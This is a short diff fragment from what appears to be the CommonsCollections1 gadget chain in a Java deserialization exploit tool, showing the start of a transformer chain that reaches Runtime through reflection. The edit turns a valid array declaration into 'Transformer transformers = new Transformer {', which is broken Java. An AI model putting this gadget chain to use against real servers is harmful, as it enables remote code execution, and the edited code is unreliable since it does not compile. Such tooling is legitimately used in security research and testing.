@@ -52,7 +52,7 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 		final Transformer transformerChain = new ChainedTransformer(
 			new Transformer[]{ new ConstantTransformer(1) });
 		// real chain for after setup
-		final Transformer[] transformers = new Transformer[] {
+		final Transformer transformers = new Transformer {
 				new ConstantTransformer(Runtime.class),
 				new InvokerTransformer("getMethod", new Class[] {
 					String.class, Class[].class }, new Object[] {
